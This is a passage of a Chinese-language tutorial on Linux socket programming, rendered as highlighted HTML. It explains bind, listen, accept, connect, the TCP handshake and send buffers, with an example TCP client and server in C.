keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span> <span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">perror</span> <span class="token punctuation">(</span><span class="token string">"bind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span> <span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">return</span> sock<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h5 id="listen">listen</h5><p>​</p><ul><li><p>初始化创建的套接字通过 listen 函数可以将原来的“主动”套接字转换为“被动”套接字，告诉操作系统内核<strong>等待用户请求</strong>，内核会为此做好接收用户请求的准备，比如完成连接队列</p></li><li><p><code>listen</code> 函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">listen</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">int</span> backlog<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>socketfd</code> 为套接字描述符</p></li><li><p><code>backlog</code>为未完成连接队列的大小，这个参数的大小决定了可以接收的并发数目（这个参数越大，并发数目理论上也会越大，但是参数过大也会占用过多的系统资源）</p><blockquote><ul><li><p>原先 Linux 实现中 backlog 参数定义了该套接字对应的未完成连接队列的最大长度（pending connections），如果一个连接到达时，队列已满，客户端将会接收一个 ECONNREFUSED 错误信息，如果支持重传，该请求可能会被忽略，之后会进行一次重传</p></li><li><p>从 Linux 2.2 开始，backlog 参数定义的是<strong>已完成连接队列的最大长度</strong>，表示的是已建立的连接（established connection），正在等待被接收（accept 调用返回），如果声明的 backlog 参数比 <code>/proc/sys/net/core/somaxconn</code> 的参数要大，那么就会使用声明的值</p></li><li><p>未完成队列的最大长度值可以通过 <code>/proc/sys/net/ipv4/tcp_max_syn_backlog</code> 完成修改，默认值为 128</p></li></ul></blockquote></li></ul></li></ul><p>​</p><p>​</p><h5 id="accept">accept</h5><p>​</p><ul><li><p>当客户端的连接请求到达时，服务器端应答成功，连接建立，这时操作系统内核要把这个事件通知到应用程序，让应用程序感知到这个连接，<strong>accept 函数的作用就是连接建立之后，操作系统内核和应用程序之间的桥梁</strong></p></li><li><p>accept 函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">int</span> listensockfd<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>cliaddr<span class="token punctuation">,</span> socklen_t <span class="token operator">*</span>addrlen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>listensockfd</code> 是套接字，可以称为 listen 套接字，这就是前面通过 bind，listen 一系列操作而得到的套接字</p></li><li><p>返回值有两个部分，第一个部分 <code>cliadd</code> 是通过指针方式获取的客户端的地址，<code>addrlen</code> 告诉地址的大小；另一部分是函数的返回值，是一个全新的描述字，代表了与客户端的连接</p></li></ul></li><li><p><strong>注意</strong>：有两个套接字描述字，第一个是监听套接字描述字 <code>listensockfd</code>作为输入参数；第二个是返回的已连接套接字描述字</p></li><li><p><strong>监听套接字一直都存在，直到这个监听套接字关闭</strong>，一个客户和服务器连接成功，完成了 TCP 三次握手，操作系统内核就为其生成一个<strong>已连接套接字</strong>，让应用服务器使用这个已连接套接字和客户进行通信处理，如果服务器完成了对这个客户的服务，关闭的就是<strong>已连接套接字</strong>，这样就完成了 TCP 连接的释放，<strong>这时候释放的只是这一个客户连接</strong></p></li></ul><p>​</p><p>​</p><h4 id="客户端发起连接">客户端发起连接</h4><ul><li>第一步建立一个套接字，客户端调用 <code>connect</code> 向服务端发起请求</li></ul><p>​</p><h5 id="connect">connect</h5><ul><li><p>客户端和服务器端的连接建立是通过 <code>connect</code> 函数完成</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>servaddr<span class="token punctuation">,</span> socklen_t addrlen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>sockfd</code> 是连接套接字，通过 <code>socket</code> 函数创建</li><li><code>servaddr</code> 和 <code>addrlen</code> 分别代表指向套接字地址结构的指针和该结构的大小</li></ul></li><li><p>在调用 <code>connect</code> 前不是必须调用 <code>bind</code> 函数，因为如果需要的话，内核会确定源 IP 地址，并按照一定的算法选择一个临时端口作为源端口</p></li><li><p>如果是 TCP 套接字，那么调用 <code>connect</code> 函数将激发 TCP 的三次握手过程，而且仅在连接建立成功或出错时才返回</p></li><li><p><strong>补充</strong>：出错返回可能有以下几种情况，根据不同的返回值可以做进一步的排查</p><ul><li><p>三次握手无法建立，客户端发出的 <code>SYN</code> 包没有任何响应，返回 <code>TIMEOUT</code> 错误，比较常见的原因是对应的服务端 IP 写错</p></li><li><p>客户端收到了 <code>RST</code>（复位）回答，这时候客户端会立即返回 <code>CONNECTION REFUSED</code> 错误，这种情况比较常见于客户端发送连接请求时的请求端口写错</p><blockquote><p>产生 RST 条件</p><ol><li><p>目的地为某端口的 SYN 到达，然而该端口上没有正在监听的服务器</p></li><li><p>TCP 想取消一个已有连接</p></li><li><p>TCP 接收到一个根本不存在的连接上的分节</p></li></ol></blockquote></li><li><p>客户发出的 SYN 包在网络上引起了<code>destination unreachable</code>，目的不可达的错误，常见的原因是客户端和服务器端路由不通</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="TCP-三次握手">TCP 三次握手</h4><ul><li><p>TCP 三次握手过程</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210206-three-way-handshake.png" alt="TCP 三次握手"></p><p>（这里使用的网络编程模型是阻塞式的，调用发起后不会直接返回，由操作系统内核处理之后才会返回）</p><blockquote><p>信道不可靠，但是通信双发需要就某个问题达成一致。而要解决这个问题, 无论在消息中包含什么信息，三次通信是理论上的最小值</p></blockquote></li><li><p>服务端通过 <code>socket</code>、<code>bind</code> 和 <code>listen</code> 完成了被动套接字的准备工作，然后调用 <code>accept</code>，就会阻塞在这里，等待客户端的连接</p></li><li><p>客户端通过 <code>socket</code> 和 <code>connect</code> 函数调用之后也会阻塞，接下来是<strong>内核网络协议栈</strong>工作，具体过程：</p><ul><li><p>客户端的协议栈向服务器端发送了 SYN 包，并告诉服务器端当前发送序列号 <code>j</code>，客户端进入 <code>SYNC_SENT</code> 状态</p></li><li><p>服务器端的协议栈收到包之后进行 ACK 应答，应答值为 <code>j+1</code>，表示对 SYN 包 j 的确认，同时服务器也发送一个 SYN 包，告诉客户端当前我的发送序列号为 <code>k</code>，服务器端进入 <code>SYNC_RCVD</code> 状态</p></li><li><p>客户端协议栈收到 ACK 之后，应用程序从 <code>connect</code> 调用返回，表示客户端到服务器端的单向连接建立成功，客户端的状态为 <code>ESTABLISHED</code>，同时客户端协议栈也会对 SYN 包进行应答，应答数据为 <code>k+1</code></p></li><li><p>应答包到达服务器端后，服务器端协议栈使得 <code>accept</code> 阻塞调用返回，这个时候服务器端到客户端的单向连接也建立成功，服务器端也进入 <code>ESTABLISHED</code> 状态</p></li></ul></li></ul><h3 id="1-5-TCP-Socket-读写">1.5 TCP Socket 读写</h3><h4 id="发送数据">发送数据</h4><ul><li><p>发送数据时常用的有三个函数 <code>write</code>、<code>send</code> 和 <code>sendmsg</code>，每个函数使用的场景略有不同</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t <span class="token function">write</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span>ssize_t <span class="token function">send</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span>ssize_t <span class="token function">sendmsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">msghdr</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>write 函数是常见的文件写函数，如果把 <code>socketfd</code> 换成文件描述符，就是普通的文件写入</li><li>send 函数是想指定选项，发送带外数据时使用，<strong>带外数据</strong>是一种基于 TCP 协议的紧急数据，用于客户端 - 服务器在特定场景下的紧急处理</li><li>sendmsg 是想<strong>指定多重缓冲区传输数据</strong>时使用，以结构体 <code>msghdr</code> 的方式发送数据</li></ul></li><li><p>在套接字描述符上调用 <code>write</code> 函数，和在普通文件描述符上调用 <code>write</code> 函数两者的表现形式是一样（都是通过描述符句柄写入指定的数据），但内在的区别不一样</p><ul><li><p>对于普通文件描述符而言，一个文件描述符代表了打开的一个文件句柄，通过调用 write 函数，操作系统内核帮我们不断地往文件系统中写入字节流，此时写入的字节流大小通常和输入参数 size 的值是相同的</p></li><li><p>对于套接字描述符而言，它代表了一个双向连接，在套接字描述符上调用 write 写入的字节数有可能比请求的数量少，这在普通文件描述符情况下是不正常的，内核为读取和发送数据做了很多表面上看不到的工作</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="发送缓冲区">发送缓冲区</h4><ul><li><p>当 TCP 三次握手成功，连接建立后，操作系统内核会为每一个连接创建配套的基础设施，比如发送缓冲区</p></li><li><p>当应用程序调用 <code>write</code> 函数时，实际所做的事情是把数据<strong>从应用程序中拷贝到操作系统内核的发送缓冲区中</strong>，并不一定是把数据通过套接字写出去</p><ul><li><p>操作系统内核的发送缓冲区足够大，可以直接容纳这份数据，我们的程序从 write 调用中退出，返回写入的字节数就是应用程序的数据大小</p></li><li><p>操作系统内核的发送缓冲区够大了，不过还有数据没有发送完，或者数据发送完了，但是操作系统内核的发送缓冲区不足以容纳应用程序数据，在这种情况下，应用程序被阻塞，大部分 UNIX 系统会一直等到可以把应用程序数据完全放到操作系统内核的发送缓冲区中，再从系统调用中返回</p></li></ul><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210225-send-buffer.png" alt=""></p></li></ul><p>​</p><p>​</p><h4 id="读取数据">读取数据</h4><ul><li><p>read 函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t <span class="token function">read</span> <span class="token punctuation">(</span><span class="token keyword">int</span> socketfd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>函数要求操作系统内核从套接字描述字 <code>socketfd</code> 读取最多多少个字节（size），并将结果存储到 buffer 中</li><li>返回值告诉我们实际读取的字节数目，也有一些特殊情况<ul><li>如果返回值为 0，表示 EOF（end-of-file），这在网络中表示对端发送了 FIN 包，要处理断连的情况</li><li>如果返回值为 -1，表示出错</li><li>如果是非阻塞 I/O，情况会略有不同</li></ul></li></ul></li><li><p>如果我们想让应用程序每次都读到 size 个字节，就需要编写下面的函数，不断地循环读取：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 从 socketfd 描述字中读取 "size" 个字节. */</span>ssize_t <span class="token function">readn</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>vptr<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t  nleft<span class="token punctuation">;</span>    ssize_t nread<span class="token punctuation">;</span>    <span class="token keyword">char</span>    <span class="token operator">*</span>ptr<span class="token punctuation">;</span>     ptr <span class="token operator">=</span> vptr<span class="token punctuation">;</span>    nleft <span class="token operator">=</span> size<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>nleft <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>nread <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> nleft<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> EINTR<span class="token punctuation">)</span>                nread <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">/* 非阻塞 I/O 的情况下，没有数据可以读，需要再次调用 read */</span>            <span class="token keyword">else</span>                <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nread <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token comment">/* EOF(End of File) 表示套接字关闭 */</span>        nleft <span class="token operator">-=</span> nread<span class="token punctuation">;</span>        ptr   <span class="token operator">+=</span> nread<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>n <span class="token operator">-</span> nleft<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/* 返回的是实际读取的字节数 */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>可不可以无限增大缓冲区</strong>，这样不就可以提高应用程序的吞吐量了么？</p><p>不行，write 函数发送数据只是将数据发送到内核缓冲区，而什么时候发送由内核决定，内核缓冲区总是充满数据时会产生<strong>粘包</strong>问题，同时网络的传输大小 MTU 也会限制每次发送的大小，最后由于数据堵塞需要消耗大量内存资源，资源使用效率不高</p></blockquote><blockquote><p>一段数据流从应用程序发送端，一直到应用程序接收端，总共经过了多少次拷贝？</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220506-copy.png" alt=""></p></blockquote></li></ul><p>​</p><p>​</p><h4 id="实验-2">实验</h4><ul><li><p>一个客户端 - 服务器的例子，其中客户端不断地发送数据，服务器端每读取一段数据之后进行休眠</p></li><li><p><em>tcp_server.c</em>：服务器端读取数据程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span><span class="token keyword">void</span> <span class="token function">read_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ssize_t n<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"block in read\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 每次读取 1K 数据之后休眠 1 秒</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">readn</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        time<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"1K read for %d \n"</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> listenfd<span class="token punctuation">,</span> connfd<span class="token punctuation">;</span>    socklen_t clilen<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> cliaddr<span class="token punctuation">,</span> servaddr<span class="token punctuation">;</span>    listenfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>INADDR_ANY<span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* bind到本地地址，端口为12345 */</span>    <span class="token function">bind</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* listen的backlog为1024 */</span>    <span class="token function">listen</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 循环处理用户请求 */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        clilen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cliaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>        connfd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>cliaddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>clilen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* 获取实际的连接 */</span>        <span class="token function">read_data</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* 读取数据 */</span>        <span class="token function">close</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">/* 关闭连接套接字，注意不是监听套接字*/</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><em>tcp_client.c</em>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token expression">MESSAGE_SIZE <span class="token number">102400</span></span></span><span class="token keyword">void</span> <span class="token function">send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 初始化一个长度为 MESSAGE_SIZE 的字符串流</span>    <span class="token keyword">char</span> <span class="token operator">*</span>query<span class="token punctuation">;</span>    query <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>MESSAGE_SIZE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MESSAGE_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        query<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    query<span class="token punctuation">[</span>MESSAGE_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>cp<span class="token punctuation">;</span>    cp <span class="token operator">=</span> query<span class="token punctuation">;</span>    size_t remaining <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>remaining<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n_written <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> remaining<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token string">"send into buffer %ld \n"</span><span class="token punctuation">,</span> n_written<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n_written <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"send failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        remaining <span class="token operator">-=</span> n_written<span class="token punctuation">;</span>        cp <span class="token operator">+=</span> n_written<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sockfd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> servaddr<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: tcpclient &lt;IPaddress&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> connect_rt <span class="token operator">=</span> <span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 向服务器端发起连接请求</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>connect_rt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"connect failed "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">send_data</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用 send_data 发送数据</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编译运行：</p><p><img src="20210225-194139.png" alt="client"></p><p><img src="20210225-194214.png" alt="server"></p><ul><li><p>程序运行后，服务端不断地在屏幕上打印出读取字节流的过程</p></li><li><p>客户端直到最后所有的字节流发送完毕才打印出“send into buffer”，说明在此之前 send 函数一直都是阻塞的，也就是说阻塞式套接字最终发送返回的实际写入字节数和请求字节数是相等的</p></li><li><p>如果把服务端的休眠时间稍微调大，客户端打印完后服务端还在屏幕上不断打印读取数据的进度，说明发送成功仅仅表示的是数据被拷贝到了发送缓冲区中，并不意味着连接对端已经收到所有的数据</p></li></ul></li></ul><p>​</p><p>​</p><h3 id="1-6-UDP-编程">1.6 UDP 编程</h3><ul><li><p>TCP 和 UDP 相比有什么差异呢？</p><ul><li><p>UDP 是一种<strong>数据报</strong>协议，而 TCP 是一种面向连接的<strong>数据流</strong>协议</p></li><li><p>TCP 在 IP 报文的基础上，增加了诸如<strong>重传、确认、有序传输、拥塞控制</strong>等能力，通信的双方是在一个确定的上下文中工作的，而 UDP 没有这样一个确定的上下文，是一个不可靠的通信协议，没有重传、确认、有序控制、拥塞控制，也不保证报文的有效传递和有序</p></li></ul></li><li><p>UDP 程序设计时的主要过程</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210225-udp.png" alt=""></p><ul><li>服务器端创建 UDP 